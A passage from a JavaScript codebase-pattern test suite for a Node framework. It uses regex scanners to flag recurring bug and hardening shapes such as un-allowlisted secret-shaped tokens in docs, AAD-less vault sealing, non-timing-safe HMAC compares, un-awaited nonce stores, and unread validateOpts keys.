  for (var ki = 0; ki < KNOWN_GITLEAKS_TRIPPING_IDS.length; ki += 1) {
    var ident = KNOWN_GITLEAKS_TRIPPING_IDS[ki];
    if (allowlist.stopwords.indexOf(ident) !== -1) continue;
    var covered = false;
    for (var ri = 0; ri < allowlist.regexes.length; ri += 1) {
      if (allowlist.regexes[ri].test(ident)) { covered = true; break; }
    }
    if (covered) continue;
    bad.push({
      file:    ".gitleaks.toml",
      line:    1,
      content: "known-gitleaks-tripping identifier '" + ident + "' is in " +
               "KNOWN_GITLEAKS_TRIPPING_IDS (codebase-patterns.test.js) but " +
               "is neither stopworded nor regex-allowlisted in .gitleaks.toml. " +
               "Add it to the [[allowlists]] stopwords block — CI gitleaks " +
               "scan will fail without it.",
    });
  }

  // Part 2 — scan operator-facing markdown for known-tripping
  // fundamental secret shapes that gitleaks flags regardless of
  // surrounding context (JWT compact serialisations, Stripe
  // `sk_live_...` tokens). These are unambiguous; no crypto-context
  // gating needed.
  var docs = ["CHANGELOG.md", "README.md", "SECURITY.md", "MIGRATING.md", "LTS-CALENDAR.md"];
  var FUNDAMENTAL_SECRET_SHAPES = [
    /\bsk_live_[A-Za-z0-9]{20,}/g,
    /\beyJ[A-Za-z0-9_-]{20,}/g,
  ];
  for (var di = 0; di < docs.length; di += 1) {
    var docPath = path.resolve(REPO_ROOT, docs[di]);
    var content;
    try { content = fs.readFileSync(docPath, "utf8"); }
    catch (_e) { continue; }
    var rel = docs[di];
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li += 1) {
      var line = lines[li];
      if (/allow:gitleaks-entropy\b/.test(line)) continue;
      for (var si = 0; si < FUNDAMENTAL_SECRET_SHAPES.length; si += 1) {
        var fre = FUNDAMENTAL_SECRET_SHAPES[si];
        fre.lastIndex = 0;
        var fm;
        while ((fm = fre.exec(line)) !== null) {
          var fmatch = fm[0];
          var fcov = false;
          for (var rj = 0; rj < allowlist.regexes.length; rj += 1) {
            if (allowlist.regexes[rj].test(fmatch)) { fcov = true; break; }
          }
          if (fcov) continue;
          if (allowlist.stopwords.indexOf(fmatch) !== -1) continue;
          bad.push({
            file:    rel,
            line:    li + 1,
            content: "secret-shape token '" + fmatch.slice(0, 30) +
                     "...' would trip CI gitleaks (JWT / Stripe shape). " +
                     "Add allowlist entry in .gitleaks.toml.",
          });
        }
      }
    }
  }

  bad = _filterMarkers(bad, "gitleaks-entropy-unallowed");
  _report("known-gitleaks-tripping identifiers (curated list in " +
          "codebase-patterns.test.js) must be stopworded or regex-" +
          "allowlisted in .gitleaks.toml; fundamental secret shapes " +
          "(JWT / Stripe `sk_live_...`) in operator-facing markdown " +
          "must also be allowlisted — front-runs CI gitleaks",
    bad);
}

// ---- Pattern: inline require() inside setImmediate / process.nextTick ----
//
// class: inline-require-in-deferred
//
// `setImmediate(() => require("./x").foo(...))` defers the require() to
// the event loop tick instead of resolving it at module load. Same
// drift class as testNoInlineRequires but inside scheduler callbacks,
// where the inline shape used to be considered "intentional" for
// circular-dep defense. The framework's lazy-require helper handles
// the cycle cleanly; deferring the require inside setImmediate adds
// a per-call cache lookup for no benefit.
//
// Caught in CRYPTO-15 (v0.9.58) — `lib/crypto.js` deferred the audit
// module require to setImmediate inside the legacy-envelope decrypt
// path. The fix routed through the lazyRequire('./audit') top-of-file
// binding.
function testNoInlineRequireInDeferred() {
  var files = _libFiles();
  var bad = [];
  var re = /(?:setImmediate|process\.nextTick|setTimeout|queueMicrotask)\s*\([^)]*?\brequire\(["']\.\.?\//;
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    // Walk pairs of consecutive lines so the regex also catches the
    // multi-line shape (`setImmediate(function () { ... require(...) })`).
    for (var j = 0; j < lines.length; j++) {
      var window = (lines[j] || "") + " " + (lines[j + 1] || "") + " " + (lines[j + 2] || "");
      if (/^\s*(\/\/|\*|\/\*)/.test(lines[j])) continue;
      if (re.test(window) && /\brequire\(["']\.\.?\//.test(window)) {
        bad.push({
          file:    _relPath(files[i]),
          line:    j + 1,
          content: lines[j].trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "inline-require-in-deferred");
  _report("require() inside setImmediate / process.nextTick / queueMicrotask " +
          "lifts to a top-of-file lazyRequire (CRYPTO-15)",
    bad);
}

// ---- Pattern: vault.seal direct in dbStore-shaped sealed-row paths ----
//
// class: seal-without-aad
//
// `vault.seal(plaintext)` produces a ciphertext that decrypts in ANY
// row of the same vault. A DB-write attacker can copy a sealed value
// from a benign row into a sensitive row and the value decrypts
// cleanly. CRYPTO-1 (v0.9.58) added `b.vault.aad.seal({ table, k,
// column })` which AAD-binds the AEAD tag to the row identity tuple.
//
// New code in dbStore / sealed-column primitives MUST route through
// `vault.aad.seal` (typically via `cryptoField.registerTable({ aad:
// true })` + `cryptoField.sealRow`). Direct `vault.seal()` use is
// only correct for whole-value envelopes the operator never copies
// between rows (audit chain entries, single-tenant secrets, etc.) —
// document with `// allow:seal-without-aad — <reason>` per call site.
function testSealWithoutAad() {
  // Grep for `vault.seal(` direct calls in files that call
  // `cryptoField.registerTable` — those files are constructing
  // per-row sealed-column primitives where cross-row swap is the
  // relevant threat model. Other files (audit-sign, session,
  // mail-store, db.js's whole-file key seal) use vault.seal for
  // whole-value envelopes with no row-identity to bind to, and
  // crypto-field.js itself owns the legacy plain-mode fallback.
  var files = _libFiles();
  var bad = [];
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    // crypto-field.js / vault-aad.js are the primitives that DEFINE
    // the sealing surface; the detector targets CALLERS that should
    // route through them.
    if (rel === "lib/crypto-field.js" || rel === "lib/vault-aad.js") continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    // Narrow heuristic — files that register a sealed table via
    // cryptoField.registerTable. db.js, session.js, audit.js seal
    // whole-value envelopes (DB encryption key, session token, audit
    // chain head) which have no row identity to bind.
    if (!/cryptoField\.registerTable\s*\(/.test(content)) continue;
    if (content.indexOf("vault.seal(") === -1) continue;
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      if (/^\s*(\/\/|\*|\/\*)/.test(lines[j])) continue;
      // Match `vault.seal(` but NOT `vault.aad.seal(` or `vaultAad.seal(`.
      if (/\bvault\.seal\(/.test(lines[j]) && !/vault\.aad\.seal\(/.test(lines[j])) {
        bad.push({
          file:    rel,
          line:    j + 1,
          content: lines[j].trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "seal-without-aad");
  _report("dbStore-shaped sealed-row code routes through vault.aad.seal " +
          "(or has allow marker) — CRYPTO-1",
    bad);
}

// ---- Pattern: raw byte literal 4*1024*1024 etc. (redundant with raw-byte-literal but explicit class) ----
//
// class: raw-mib-literal
//
// Catches the SPECIFIC `N * 1024 * 1024` shape that drifts into
// safeJson maxBytes / response caps / file-size limits. The generic
// raw-byte-literal detector also catches these (every product of 1024
// is byte-shaped), but the explicit class id makes the operator-side
// message specific: "use C.BYTES.mib(N)".
//
// Caught in CRYPTO-21 / CRYPTO-22 (v0.9.58) — metrics.snapshot.read
// and middleware/idempotency-key.js both used `4 * 1024 * 1024` as
// the safeJson cap. Routed through `C.BYTES.mib(4)`.
function testNoRawMibLiteral() {
  var matches = _scan(/\b\d+\s*\*\s*1024\s*\*\s*1024\b/);
  // lib/constants.js IS the definition of C.BYTES.mib / .gib — the
  // raw multiplication lives there by construction.
  matches = matches.filter(function (m) { return m.file !== "lib/constants.js"; });
  matches = _filterMarkers(matches, "raw-mib-literal");
  // Defer to the generic raw-byte-literal allow markers too; the new
  // class is additive rather than replacing.
  matches = _filterMarkers(matches, "raw-byte-literal");
  _report("`N * 1024 * 1024` byte-shape literal routes through C.BYTES.mib(N) — CRYPTO-21 / CRYPTO-22",
    matches);
}

// ---- Pattern: hex-string SHA compares with === / !== ----
//
// class: hex-sha-compare-equals
//
// Operators sometimes compare two hex digest strings via plain `===` /
// `!==`. The shape works at length-equal but leaks per-byte timing.
// CVE-2026-21713 underscored the pattern: HMAC verification MUST route
// through `nodeCrypto.timingSafeEqual` / `b.crypto.timingSafeEqual`
// even when both sides are hex strings.
function testNoHexShaCompareEquals() {
  // CVE-2026-21713 — HMAC / signature / MAC verify paths MUST route
  // through timingSafeEqual. Match identifier-name pairs where at
  // least one side carries an auth-verification semantic
  // (`hmac*Hex` / `mac*Hex` / `tagHex` / `signature*Hex`). Bare
  // `digestHex === otherDigest` (config-drift / snapshot integrity)
  // is NOT an attacker-influenced compare and stays out of scope.
  var matches = _scan(
    /\b(hmac\w*|mac\w*|signature\w*|sigVerify\w*)Hex\s*(===|!==)\s*\w+/i);
  matches = matches.concat(_scan(
    /\b\w+Hex\s*(===|!==)\s*(hmac\w*Hex|mac\w*Hex|signature\w*Hex|sigVerify\w*Hex)/i));
  matches = _filterMarkers(matches, "hex-sha-compare-equals");
  matches = _filterMarkers(matches, "raw-hash-compare");
  _report("hex HMAC / MAC / signature compared with timingSafeEqual " +
          "(CVE-2026-21713 — memcmp leaks per-byte timing)",
    matches);
}

// ---- Pattern: per-recipient outcome loop fall-through to failure path ----
//
// class: outcome-branch-fallthrough-to-failed
//
// v0.11.24 mail-send-deliver bring-up: the per-recipient delivery loop
// branched `if (res.outcome === "delivered") { delivered.push({...}); }`
// but had no `continue;` after the push — execution fell through into
// the unconditional `failed.push({...})` + DSN-emit path further down
// the loop body. Every recipient that delivered successfully also
// landed in `failed[]`. The fix added an explicit `continue;` (and
// re-shaped the conditional so only converted-permanent / direct-
// permanent reaches the failure handler).
//
// The shape is generic: an outcome-classifying loop where the SUCCESS
// branch pushes into a success array but doesn't exit the iteration
// before the FAILURE-side push runs. This detector flags occurrences
// of `<name>.push(` for a success-shaped array immediately followed
// (within 12 lines, no intervening `continue;` / `return` / `break`)
// by `failed.push(` in the same function body.
function testNoOutcomeBranchFallthroughToFailed() {
  var files = _libFiles();
  var bad = [];
  var successNames = ["delivered", "succeeded", "sent", "completed"];
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      var hit = false;
      var successName = null;
      for (var k = 0; k < successNames.length; k++) {
        var name = successNames[k];
        // Match `<name>.push(`  (object-property push, not a bare var).
        if (new RegExp("\\b" + name + "\\.push\\s*\\(").test(line)) {
          hit = true;
          successName = name;
          break;
        }
      }
      if (!hit) continue;
      // Skip if THIS very line also exits the iteration.
      if (/\b(continue|return|break)\b/.test(line)) continue;
      // Look ahead up to 12 lines for `failed.push(` without an
      // intervening exit. The push is open-paren-only so multi-line
      // arg lists still count as exit-free if no continue lands.
      var exitedEarly = false;
      var foundFailedPush = false;
      var failedLine = -1;
      for (var step = 1; step <= 12 && j + step < lines.length; step++) {
        var probe = lines[j + step];
        if (/^\s*(\/\/|\*)/.test(probe)) continue;
        if (/\b(continue|return|break|throw)\b/.test(probe)) {
          exitedEarly = true;
          break;
        }
        // Closing `}` at column 0-4 ends the immediate enclosing block;
        // if we reach the loop's `}` without a continue, that's the fall-
        // through shape we want to catch — but reaching a SIBLING `}`
        // means we left the if-block already. Conservative: stop scan on
        // a line that starts with `}` followed by `else` (clearly a
        // sibling branch in the same if-else chain — not an exit).
        if (/\bfailed\.push\s*\(/.test(probe)) {
          foundFailedPush = true;
          failedLine = j + step;
          break;
        }
      }
      if (foundFailedPush && !exitedEarly) {
        bad.push({
          file:    _relPath(files[i]),
          line:    j + 1,
          content: successName + ".push(...) → failed.push(...) " +
                   "fall-through (line " + (failedLine + 1) + ")",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "outcome-branch-fallthrough-to-failed");
  _report("per-recipient outcome loop: `delivered`/`succeeded`/`sent`/`completed` " +
          ".push branch exits the iteration before reaching `failed.push` " +
          "(v0.11.24 mail-send-deliver bring-up)",
    bad);
}

// ---- Pattern: smtpTransport opts pass `hostnameLocal` instead of `ehloName` ----
//
// class: smtp-transport-hostname-local-typo
//
// v0.11.24 Codex P2-a: `b.mail.smtpTransport` reads `opts.ehloName` for
// the EHLO/HELO identity. Passing `hostnameLocal` is a no-op — the
// transport silently falls back to the default identity (`blamejs`),
// which breaks deliverability + policy enforcement on receivers that
// expect a specific configured hostname. The shape is easy to type
// (HostnameLocal-style variable name in the caller) but invisible
// without integration testing because the transport doesn't refuse
// unknown opts.
function testNoSmtpTransportHostnameLocalOpt() {
  var files = _libFiles();
  var bad = [];
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    var insideTransportCall = false;
    var transportCallStart = -1;
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*)/.test(line)) continue;
      // Open: smtpTransport( OR .smtpTransport.create( OR transportFactory(
      if (/\b(smtpTransport|transportFactory)\s*(\.\s*create\s*)?\(/.test(line)) {
        insideTransportCall = true;
        transportCallStart = j;
      }
      if (insideTransportCall) {
        if (/\bhostnameLocal\s*:/.test(line)) {
          bad.push({
            file:    _relPath(files[i]),
            line:    j + 1,
            content: "smtpTransport call passes `hostnameLocal:` (transport reads `ehloName:`)",
          });
        }
        if (/\)\s*;?\s*$/.test(line) && j > transportCallStart) {
          insideTransportCall = false;
        }
      }
    }
  }
  bad = _filterMarkers(bad, "smtp-transport-hostname-local-typo");
  _report("smtpTransport opts use `ehloName:` (not `hostnameLocal:`) for EHLO identity " +
          "(v0.11.24 Codex P2-a — silent fall-back to default hostname)",
    bad);
}

// ---- Pattern: resolver.queryMx result treated as array without normalising ----
//
// class: resolver-querymx-shape-assumed
//
// v0.11.24 Codex P1: when the operator injects a
// `b.network.dns.resolver.create()` instance as `resolver`, its
// `queryMx(domain)` returns `{ rrs: [...], ttl, ... }` — not a raw
// array. Code that calls `resolver.queryMx(...)` and then immediately
// runs `Array.isArray(result)` / `result.length` / `result[0]` against
// the return value silently converts every successful lookup into a
// no-MX permanent failure when the framework resolver is in use.
// The fix normalises across both shapes (`{rrs}` → `rrs`; bare array
// → passthrough) before the array checks run.
function testResolverQueryMxShapeNormalised() {
  var files = _libFiles();
  var bad = [];
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*)/.test(line)) continue;
      // Match `\w+\.queryMx(` patterns (the resolver-method call).
      if (!/\bqueryMx\s*\(/.test(line)) continue;
      // Look at the next ~10 lines for `.rrs` normalisation. If
      // none found AND we see an Array.isArray / .length / [0]
      // probe of the same return value within that window, flag.
      var normalised = false;
      var assumedArray = false;
      for (var step = 0; step <= 10 && j + step < lines.length; step++) {
        var probe = lines[j + step];
        if (/\.rrs\b/.test(probe)) { normalised = true; break; }
        if (step > 0 && /\b(Array\.isArray|\.length|\[0\])\b/.test(probe)) {
          assumedArray = true;
        }
      }
      if (!normalised && assumedArray) {
        bad.push({
          file:    _relPath(files[i]),
          line:    j + 1,
          content: "resolver.queryMx return treated as Array without `.rrs` normalisation",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "resolver-querymx-shape-assumed");
  _report("resolver.queryMx return normalised across `{rrs}` and bare-Array shapes " +
          "before Array probes (v0.11.24 Codex P1 — silent no-MX on framework resolver)",
    bad);
}

// ---- Pattern: b.money.create(<Number>) / Money + Number arithmetic ----
//
// class: no-number-money-arithmetic
//
// `b.money` is the framework's defense against IEEE 754 binary-fraction
// drift on monetary values. The boundary discipline is: every amount
// crosses into a `Money` instance as BigInt minor units OR a decimal-
// shaped string; Numbers are refused at construction. The detector
// extends the discipline to call sites in lib/:
//
//   1. `b.money.create(<NumericLiteral>, ...)` or
//      `b.money.of(<NumericLiteral>, ...)` -- caller passes a literal
//      Number (e.g. `b.money.of(12.50, "USD")`) where a string or BigInt
//      is required. The framework's own code shouldn't trip this — but
//      a future consumer-side primitive grafted onto lib/ could.
//   2. A bare `Number(<money-shaped-var>)` or arithmetic operator
//      (`+` / `-` / `*` / `/`) that mixes a Money instance with a
//      Number literal: `m + 1.5`, `m * 0.07`. The IEEE drift bug.
//
// The detector flags both shapes when they appear in lib/ outside
// lib/money.js itself.
function testNoNumberMoneyArithmetic() {
  var files = _libFiles();
  var bad = [];
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    // The primitive itself owns the construction surface and gets a
    // pass — the boundary refusal happens INSIDE `of(...)` here.
    if (rel === "lib/money.js") continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      // Shape 1: `b.money.create(<numeric-literal>, ...)` or `.of(...)`.
      // Numeric literal = bare digits OR digits with a decimal point,
      // not a BigInt (no trailing `n`) and not a string (no quotes).
      if (/\bb\.money\.(?:of|create)\s*\(\s*-?\d+(?:\.\d+)?\s*,/.test(line)) {
        bad.push({
          file:    rel,
          line:    j + 1,
          content: "b.money.{of|create}(<Number>, ...) -- pass BigInt minor units (e.g. 250n) or decimal-shaped string (\"2.50\") instead",
        });
      }
      // Shape 2: arithmetic operator between a likely-Money-named
      // identifier (`price`, `total`, `subtotal`, `amount`, `fee`, etc.)
      // and a numeric literal. False-positive resistant: the lhs must
      // be a Money-shaped identifier AND the operator must be `+` / `-`
      // / `*` / `/` with a numeric literal on the rhs.
      if (/\b(price|total|subtotal|amount|fee|charge|tax|discount|tip|balance|due|paid|refund|cost)\s*[+\-*/]\s*-?\d+(?:\.\d+)?\b(?!n)/.test(line)) {
        // Skip when the result is clearly NOT money math: index access,
        // length comparison, etc. The pattern is broad on purpose;
        // operators use the `allow:no-number-money-arithmetic` marker
        // when the identifier is a count/index rather than a Money.
        bad.push({
          file:    rel,
          line:    j + 1,
          content: "Money-shaped identifier arithmetic with Number literal -- route through Money.multiply / add / subtract on a Money instance",
        });
      }
    }
  }
  bad = _filterMarkers(bad, "no-number-money-arithmetic");
  _report("b.money.of / .create refuses Number amounts; Money instances " +
          "compose via .add / .subtract / .multiply (no Number arithmetic " +
          "leaks through the API boundary)",
    bad);
}

// ---- Pattern: bot-challenge verifier mustn't leak its `secret` opt ----
//
// class: bot-challenge-secret-in-audit
//
// b.auth.botChallenge (lib/auth/bot-challenge.js) holds the operator-
// issued provider secret in closure and POSTs it in the siteverify
// body. The verifier's audit emissions are designed to NEVER include
// the secret — only the token prefix (8 chars), provider key, and
// verdict surface in metadata. Any future edit that drops the
// `secret` bytes into an audit emit payload would silently leak the
// secret to whatever sink the operator wired (log stream / disk /
// SIEM). The detector scans `lib/auth/bot-challenge.js` exclusively —
// other modules' `secret` opts have their own audit-leak policies
// and a universal ban would generate noise.
//
// Shape: an emit-open line (`audit*.emit(` / `audit*.safeEmit(` /
// `audit*.event(` / `_safeAudit(`) followed within 15 lines by a
// value-position reference to the `secret` identifier (`secret:`,
// `,secret,`, `: secret`, `secret)`).
function testBotChallengeSecretNotInAudit() {
  var bad = [];
  var TARGET = "lib/auth/bot-challenge.js";
  var files = _libFiles();
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    if (rel !== TARGET) continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    // Two-pass approach: pass 1 collects every line that references
    // `secret` in a value/key position; pass 2 walks the file and
    // confirms each flagged line is INSIDE an audit-payload scope.
    //
    // Scope shapes (any one triggers):
    //   A. Within 15 lines AFTER an emit-open line
    //      (`audit*.emit(` / `audit*.safeEmit(` / `audit*.event(`
    //      / `_safeAudit(`).
    //   B. Within an object-literal variable assignment whose
    //      name contains "audit" / "meta" / "metadata" / "successMeta"
    //      / "Meta" — the metadata-construction-then-emit shape
    //      where the secret would leak via the staged variable.
    //
    // The two-pass design catches both the inline-payload leak
    // (Shape A) and the assemble-then-emit leak (Shape B) that a
    // single forward window misses.
    //
    // Skip the spec-prose comment block at the top of the file by
    // restricting matches to lines that look like executable code
    // (not `*` continuation, not `//`).
    var secretRefs = [];
    for (var j0 = 0; j0 < lines.length; j0++) {
      var l = lines[j0];
      if (/^\s*(\/\/|\*|\/\*)/.test(l)) continue;
      if (/\bsecret\s*:/.test(l) ||
          /[:,]\s*secret\b/.test(l) ||
          /\bsecret\s*\)/.test(l)) {
        secretRefs.push(j0);
      }
    }
    if (secretRefs.length === 0) {
      // Fast path — nothing references secret in a value position,
      // detector exits clean.
      continue;
    }

    // Build the scope index — every line gets an "in audit payload"
    // marker. We track an `inMetaVar` flag that opens on a
    // `var <Meta>name = {` line and closes on `};`. Parallel: an
    // `emitWindowUntil` index ticks down from 15 each line after an
    // emit-open. Either being non-zero/true makes secretRefs at that
    // line a violation.
    var emitWindow = 0;
    var inMetaVar = false;
    var inScope = new Array(lines.length);
    for (var k0 = 0; k0 < lines.length; k0++) {
      var ln = lines[k0];
      if (/^\s*(\/\/|\*|\/\*)/.test(ln)) {
        inScope[k0] = false;
        if (emitWindow > 0) emitWindow -= 1;
        continue;
      }
      if (/\baudit\w*\.(?:emit|safeEmit|event)\s*\(/.test(ln) ||
          /\b_safeAudit\s*\(/.test(ln)) {
        emitWindow = 16;
      }
      if (/\bvar\s+(?:\w*Meta\w*|\w*[Mm]etadata\w*|\w*audit\w*)\s*=\s*\{/.test(ln)) {
        inMetaVar = true;
      }
      inScope[k0] = (emitWindow > 0) || inMetaVar;
      if (inMetaVar && /^\s*\};/.test(ln)) {
        inMetaVar = false;
      }
      if (emitWindow > 0) emitWindow -= 1;
    }

    for (var r = 0; r < secretRefs.length; r++) {
      var idx = secretRefs[r];
      if (inScope[idx]) {
        bad.push({
          file:    rel,
          line:    idx + 1,
          content: lines[idx].trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "bot-challenge-secret-in-audit");
  _report("b.auth.botChallenge must NEVER include the `secret` opt in " +
          "any audit emit payload (token prefix is the only operator-" +
          "visible debug surface)",
    bad);
}

// ---- Pattern: nonceStore.has/.set treated as sync ----
//
// class: noncestore-sync-treatment
//
// v0.11.25 Codex P1: `b.webhook.verify`'s replay-defense path
// originally called `ns.has(key)` synchronously — but operators wire
// Redis / KV / DynamoDB adapters whose `has` returns Promise<boolean>.
// `if (Promise)` is always truthy → every first-time webhook gets
// refused as a replay. The fix awaits `has` + `set`; this detector
// flags any code that calls `<x>.has(...)` or `<x>.set(...)` against
// an identifier shape-hinted as a nonce/replay/replays store WITHOUT
// `await` / `.then(` in the same line.
function testNonceStoreAwaited() {
  var files = _libFiles();
  var bad = [];
  var re = /\b(\w*(?:nonce|replay|nonceStore|replayStore)\w*)\.(has|set)\s*\(/;
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (/^\s*(\/\/|\*)/.test(line)) continue;
      if (!re.test(line)) continue;
      // Skip when the line already awaits OR `.then(`s the call.
      if (/\bawait\b/.test(line)) continue;
      if (/\.then\s*\(/.test(line)) continue;
      bad.push({ file: _relPath(files[i]), line: j + 1, content: line.trim() });
    }
  }
  bad = _filterMarkers(bad, "noncestore-sync-treatment");
  _report("nonceStore-shaped `.has(...)` / `.set(...)` calls await the result " +
          "(v0.11.25 Codex P1 — async backends return Promises)",
    bad);
}

// ---- Pattern: mail-store FTS insert outside transaction ----
//
// class: mail-store-fts-untransacted
//
// v0.11.25 Codex P1: appendMessage runs `stmtInsertMsg` →
// `stmtBumpFolderModseq` → `stmtBumpQuota` → `stmtInsertFts`. Without
// a `db.transaction(...)` wrap, a crash between the 3rd and 4th
// statement persists the message but leaves the FTS index out of
// step (the row exists but is unsearchable). Detector flags any
// `stmtInsertFts.run(...)` call site in `lib/mail-store.js` whose
// surrounding function does NOT include a `db.transaction(` call.
function testMailStoreFtsInTransaction() {
  var bad = [];
  var path = "lib/mail-store.js";
  var content;
  try { content = fs.readFileSync(path, "utf8"); }
  catch (_e) { return; }
  // If the file references stmtInsertFts.run(...) at all, the closest-
  // enclosing function MUST also reference `db.transaction(` somewhere
  // — either the caller in `appendMessage` (the public surface) or
  // the inner `_appendMessage` body itself. The cheapest correct check
  // is file-level: if there's an stmtInsertFts.run( there MUST be at
  // least one `db.transaction(` reference too.
  if (/\bstmtInsertFts\.run\s*\(/.test(content) && !/\bdb\.transaction\s*\(/.test(content)) {
    var idx = content.search(/\bstmtInsertFts\.run\s*\(/);
    var lineNo = content.slice(0, idx).split(/\r?\n/).length;
    bad.push({
      file: path, line: lineNo,
      content: "stmtInsertFts.run referenced but no db.transaction wrapper present",
    });
  }
  bad = _filterMarkers(bad, "mail-store-fts-untransacted");
  _report("mail-store FTS insert runs inside `db.transaction(...)` " +
          "(v0.11.25 Codex P1 — state-drift if FTS row fails after canonical row commits)",
    bad);
}

// ---- Pattern: validateOpts-accepted key never read ----
//
// class: validateopts-key-never-read
//
// v0.14.21 — csp-report's @opts documented `audit: boolean // default
// true` and validateOpts accepted the key, but create() never read
// opts.audit: the documented disable knob was a silent no-op (the
// violation audit row fired unconditionally). A sweep found the same
// shape in honeytoken (injectable audit sink ignored), config
// ("reserved for future" knob), and others — all wired or
// de-advertised in the same release. The validateOpts allowlist IS
// the operator contract: a key it accepts that no code reads is
// advertised surface with no implementation.
//
// The detector: every string key in a direct
// `validateOpts(<ident>, [ ... ])` call's array literal must be read
// as `<ident>.<key>` (dot) or `<ident>["<key>"]` (literal bracket)
// somewhere in the same file. Keys consumed STRUCTURALLY — via a
// computed `ident[k]` loop over a key table, or by forwarding the
// whole opts object to a sub-factory in another file — can't be
// verified file-locally and carry an ALLOW entry below citing where
// the key is actually consumed.
function testValidateOptsAcceptedKeysAreRead() {
  // "<relative file>::<ident>.<key>" -> consumption cite (the reason
  // the file-local read is absent). Adding an entry requires naming
  // the real consumption site; "we'll wire it later" is not a reason.
  var ALLOW = Object.create(null);
  // jwt-external: the whole opts object is forwarded as `vopts` to
  // _selectKey; consumed as vopts.allowKidlessJwks (jwt-external.js:281).
  ALLOW["lib/auth/jwt-external.js::opts.allowKidlessJwks"] = true;
  // step-up: the validated `requirement` IS buildChallenge's `req`;
  // read as req.authorizationDetails (step-up.js:266 — emits the
  // RFC 9396 authorization_details challenge param).
  ALLOW["lib/auth/step-up.js::requirement.authorizationDetails"] = true;
  // cache: redis* keys are prefix-mapped via
  // redisClient.pickClientOpts(opts, "redis") (cache.js redis backend
  // branch → the prefix table in redis-client.js).
  ["redis", "redisPassword", "redisUsername", "redisTls", "redisCa",
   "redisServername", "redisConnectTimeoutMs", "redisCommandTimeoutMs",
   "redisMaxReconnectAttempts"].forEach(function (k) {
    ALLOW["lib/cache.js::opts." + k] = true;
  });
  // flag-providers: passed-through spec metadata — the whole spec is
  // stored (flags[key] = opts.flags[key]) and returned via
  // provider.get()/evaluate(); operator tooling reads the fields.
  ["description", "tags", "kind"].forEach(function (k) {
    ALLOW["lib/flag-providers.js::spec." + k] = true;
  });
  // body-parser: per-parser sub-configs read via the computed
  // `opts[name]` in _resolve(name) (body-parser.js _resolve loop).
  ["json", "urlencoded", "text", "raw", "multipart"].forEach(function (k) {
    ALLOW["lib/middleware/body-parser.js::opts." + k] = true;
  });
  // web-app-manifest: manifest fields read via the computed `opts[k]`
  // manifest-build loop (web-app-manifest.js Object.keys(opts) filter).
  ["short_name", "description", "scope", "display", "display_override",
   "orientation", "theme_color", "background_color", "screenshots",
   "shortcuts", "categories", "lang", "dir", "id",
   "prefer_related_applications", "related_applications"].forEach(function (k) {
    ALLOW["lib/middleware/web-app-manifest.js::opts." + k] = true;
  });
  // sigv4-bucket-ops: per-method opts forwarded to _actor(callerOpts) →
  // requestHelpers.resolveActorWithOverride (callerOpts.req read in
  // request-helpers.js; callerOpts.actor is the override seed at
  // sigv4-bucket-ops.js _actor).
  ALLOW["lib/object-store/sigv4-bucket-ops.js::opts.req"] = true;
  ALLOW["lib/object-store/sigv4-bucket-ops.js::opts.actor"] = true;
  // pubsub: the whole opts object is forwarded to
  // pubsubCluster().create(opts) / pubsubRedis().create(opts)
  // (pubsub.js _resolveBackend); keys consumed in those backends.
  ["cluster", "pollIntervalMs", "retentionMs", "pruneEveryMs",
   "redisUrl", "redisPassword", "redisUsername", "redisTls", "redisCa",
   "redisServername"].forEach(function (k) {
    ALLOW["lib/pubsub.js::opts." + k] = true;
  });

  // Upper primitives that READ specific keys off a forwarded opts object — a
  // caller that delegates to one consumes those keys WITHOUT an `opts.<key>`
  // literal. Recognized at the primitive (not per-callsite ALLOW): e.g. the
  // state-change middlewares forward opts to requestHelpers.makeSkipMatcher,
  // which reads opts.skipPaths + opts.skip.
  var FORWARD_PRIMITIVES = {
    makeSkipMatcher: ["skipPaths", "skip"],
    // gateContract.resolveProfileName(opts, postures, default) reads
    // opts.profile + opts.posture to derive a profile name — a factory that
    // delegates to it consumes both keys without an `opts.profile` literal.
    resolveProfileName: ["profile", "posture"],
  };
  var files = _libFiles();
  var bad = [];
  var callRe = /\bvalidateOpts\s*\(\s*(\w+)\s*,\s*\[([\s\S]*?)\]/g;
  for (var i = 0; i < files.length; i++) {
    var rel = _relPath(files[i]);
    if (rel === "lib/validate-opts.js") continue;
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    // A key is commonly consumed not as `opts.X` directly but as `cfg.X` after
